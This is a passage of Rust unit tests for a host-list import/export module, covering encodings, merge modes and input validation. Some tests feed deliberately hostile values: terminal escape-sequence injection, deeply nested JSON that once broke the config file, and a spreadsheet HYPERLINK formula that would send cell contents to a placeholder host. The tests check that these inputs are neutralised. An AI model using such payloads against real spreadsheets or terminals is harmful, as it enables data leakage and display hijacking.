        let text = "name,mac,group\r\nサーバー,00:11:22:33:44:66,書斎\r\n";
        let (sjis, _, _) = encoding_rs::SHIFT_JIS.encode(text);
        assert!(std::str::from_utf8(&sjis).is_err());
        let data = parse_import(&sjis, Some(Format::Csv), None).unwrap();
        assert_eq!(data.warnings.len(), 1);
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.name, "サーバー");
        assert_eq!(h.group.as_deref(), Some("書斎"));
    }

    #[test]
    fn japanese_headers_and_utf8_bom() {
        let text =
            "\u{FEFF}名前,MAC アドレス,IP アドレス,メモ\nPC1,00-11-22-33-44-77,192.168.1.20,机\n";
        let data = parse_import(text.as_bytes(), None, Some(Path::new("hosts.csv"))).unwrap();
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.name, "PC1");
        assert_eq!(h.address.as_ref().unwrap().to_string(), "192.168.1.20");
        assert_eq!(h.notes.as_deref(), Some("机"));
    }

    #[test]
    fn merge_matches_by_id_then_name() {
        let mut c = cfg();
        let csv = "id,name,mac,notes\n\
                   5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44,NAS-renamed,00:11:22:33:44:55,new\n\
                   ,lab-pc,AA:BB:CC:DD:EE:FF,\n\
                   ,Desk,02:00:00:00:00:01,\n";
        let s = import(&mut c, csv.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.updated, vec!["NAS-renamed", "lab-pc"]);
        assert_eq!(s.added, vec!["Desk"]);
        assert_eq!(c.hosts.len(), 3);
        let nas = c
            .get("5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44".parse().unwrap())
            .unwrap();
        assert_eq!(nas.name, "NAS-renamed");
        assert_eq!(
            nas.extra.get("future").and_then(|v| v.as_str()),
            Some("kept")
        );
        let lab = c.find("lab-pc").unwrap();
        assert_eq!(lab.id.to_string(), "9d7e2b10-8c4f-4a36-b1e2-6f3a0c5d7e91");
        // Columns missing from the CSV are kept.
        assert_eq!(lab.targets.len(), 2);
        assert_eq!(lab.tcp_ports, vec![3389, 22]);
        assert_eq!(lab.interfaces, vec!["Ethernet 2"]);
        assert!(!lab.broadcast);
        assert_eq!(nas.address.as_ref().unwrap().to_string(), "192.168.1.10");
    }

    #[test]
    fn toml_partial_host_updates_only_given_keys() {
        let mut c = cfg();
        let toml = "[[hosts]]\nname = \"Lab-PC\"\nmac = \"AA:BB:CC:DD:EE:FF\"\nnotes = \"moved\"\n";
        let s = import(&mut c, toml.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.updated, vec!["Lab-PC"]);
        let lab = c.find("Lab-PC").unwrap();
        assert_eq!(lab.notes.as_deref(), Some("moved"));
        assert_eq!(lab.targets.len(), 2);
        assert_eq!(lab.probe, Some(ProbeMethod::Tcp));
        // Importing the same thing again is a no-op.
        let s = import(&mut c, toml.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.unchanged, vec!["Lab-PC"]);
    }

    #[test]
    fn replace_mode_removes_others() {
        let mut c = cfg();
        let csv = "name,mac\nNAS,00:11:22:33:44:55\n";
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                mode: ImportMode::Replace,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.removed, vec!["Lab-PC"]);
        assert_eq!(c.hosts.len(), 1);
        assert_eq!(
            c.hosts[0].id.to_string(),
            "5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44"
        );
    }

    #[test]
    fn invalid_rows_fail_or_skip() {
        let csv = "name,mac\nGood,02:00:00:00:00:02\nBad,zz\nGood,02:00:00:00:00:03\n";
        let mut c = cfg();
        let before = c.clone();
        let e = import(&mut c, csv.as_bytes(), None, &ImportOptions::default()).unwrap_err();
        assert!(matches!(e, Error::Import { .. }), "{e:?}");
        assert_eq!(c, before, "atomic");
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                skip_invalid: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.added, vec!["Good"]);
        assert_eq!(s.skipped.len(), 2, "bad MAC and duplicate name");
        assert_eq!(s.skipped[0].location, "row 3");
    }

    #[test]
    fn preview_does_not_change() {
        let c = cfg();
        let json = r#"{"hosts":[{"name":"New","mac":"02:00:00:00:00:05"}],"settings":{"wake":{"repeat":2}}}"#;
        let s = preview(
            &c,
            json.as_bytes(),
            None,
            &ImportOptions {
                include_settings: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.added, vec!["New"]);
        assert!(s.settings_replaced);
        assert_eq!(c, cfg());
        let mut c2 = c.clone();
        import(
            &mut c2,
            json.as_bytes(),
            None,
            &ImportOptions {
                include_settings: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(c2.settings.wake.repeat, 2);
        assert_eq!(affected_ids(&c, &c2).len(), 1);
    }

    #[test]
    fn json_array_and_errors() {
        let data =
            parse_import(br#"[{"name":"A","mac":"02:00:00:00:00:07"}]"#, None, None).unwrap();
        assert_eq!(data.format, Format::Json);
        assert!(data.records[0].host.is_ok());
        let e = parse_import(b"{\"hosts\": [", Some(Format::Json), None).unwrap_err();
        assert!(matches!(e, Error::ConfigParse { .. }));
        let e = parse_import(b"x = [", Some(Format::Toml), None).unwrap_err();
        assert!(matches!(e, Error::ConfigParse { line: Some(1), .. }));
        let e = parse_import(b"a,b\n1,2\n", Some(Format::Csv), None).unwrap_err();
        assert!(matches!(e, Error::Import { .. }));
    }

    /// A 258-byte JSON file used to make config.toml unreadable (the TOML parser gives up
    /// at a depth JSON allows).
    #[test]
    fn deeply_nested_unknown_keys_are_refused() {
        let deep = |n: usize| {
            format!(
                r#"{{"hosts":[{{"name":"d","mac":"00:11:22:33:44:dd","deep":{}1{}}}],"settings":{{"x":{}1{}}}}}"#,
                "[".repeat(n),
                "]".repeat(n),
                "[".repeat(n),
                "]".repeat(n)
            )
        };
        let data = parse_import(deep(100).as_bytes(), None, None).unwrap();
        assert!(matches!(
            data.records[0].host,
            Err(RecordError::Malformed { .. })
        ));
        assert!(data.settings.is_none());
        assert!(
            data.warnings.iter().any(|w| w.contains("nested")),
            "{:?}",
            data.warnings
        );
        let mut c = cfg();
        assert!(
            import(
                &mut c,
                deep(100).as_bytes(),
                None,
                &ImportOptions::default()
            )
            .is_err()
        );
        // Shallow unknown keys are still carried along and stay readable.
        let data = parse_import(deep(5).as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert!(h.extra.contains_key("deep"));
        let mut c = Config::default();
        c.hosts.push(h);
        Config::from_toml(&c.to_toml().unwrap()).unwrap();
    }

    #[test]
    fn imported_names_groups_and_notes_lose_control_characters() {
        let json = "{\"hosts\":[{\"name\":\"evil\\u001b]0;PWNED\\u0007\",\"mac\":\"02:00:00:00:00:31\",\
            \"group\":\"g\\u001b[31m\",\"notes\":\"n\\u001b[31mote\\r\\nline 2\"}]}";
        let data = parse_import(json.as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert_eq!(h.name, "evil ]0;PWNED");
        assert_eq!(h.group.as_deref(), Some("g [31m"));
        assert_eq!(h.notes.as_deref(), Some("n[31mote\nline 2"));
        let csv = "name,mac,notes\nX,02:00:00:00:00:32,\"a\u{1b}[2Jb\"\n";
        let data = parse_import(csv.as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert_eq!(h.notes.as_deref(), Some("a[2Jb"));
    }

    #[test]
    fn csv_export_neutralizes_formulas_and_import_restores_them() {
        let mut c = Config::default();
        for (i, (name, group, notes)) in [
            (
                "=1+1",
                "@SUM(A1)",
                "=HYPERLINK(\"http://example.invalid/?\"&A2,\"x\")",
            ),
            ("-server", "+g", "'=already quoted"),
            ("plain", "Home", "a = b"),
        ]
        .into_iter()
        .enumerate()
        {
            let mac = format!("02:00:00:00:00:4{i}").parse().unwrap();
            let mut h = Host::new(name, mac);
            h.group = Some(group.into());
            h.notes = Some(notes.into());
            c.hosts.push(h);
        }
        let bytes = export(
            &c,
            &ExportOptions {
                format: Format::Csv,
                include_settings: false,
            },
        )
        .unwrap();
        let text = String::from_utf8(bytes.clone()).unwrap();
        for cell in [
            "'=1+1",
            "'@SUM(A1)",
            "\"'=HYPERLINK(",
            "'-server",
            "'+g",
            "''=already quoted",
            ",plain,",
            ",a = b,",
        ] {
            assert!(text.contains(cell), "{cell}: {text}");
        }
        let mut back = Config::default();
        import(&mut back, &bytes, None, &ImportOptions::default()).unwrap();
        for (a, b) in back.hosts.iter().zip(&c.hosts) {
            assert_eq!(a.name, b.name);
            assert_eq!(a.group, b.group);
            assert_eq!(a.notes, b.notes);
        }
    }

    #[test]
    fn imports_refuse_too_many_ports_and_multicast_macs() {
        let ports: Vec<String> = (20000..20017).map(|p| p.to_string()).collect();
        let json = format!(
            r#"{{"hosts":[{{"name":"many","mac":"02:00:00:00:00:51","tcp_ports":[{}]}},{{"name":"mc","mac":"11:22:33:44:55:66"}}]}}"#,
            ports.join(",")
        );
        let data = parse_import(json.as_bytes(), None, None).unwrap();
        let issues = |i: usize| match &data.records[i].host {
            Err(RecordError::Fields { errors, .. }) => {
                errors.iter().map(|e| e.issue).collect::<Vec<_>>()
            }
            other => panic!("{other:?}"),
        };
        assert_eq!(issues(0), vec![FieldIssue::TooManyPorts]);
        assert_eq!(issues(1), vec![FieldIssue::MacNotUnicast]);
    }
}
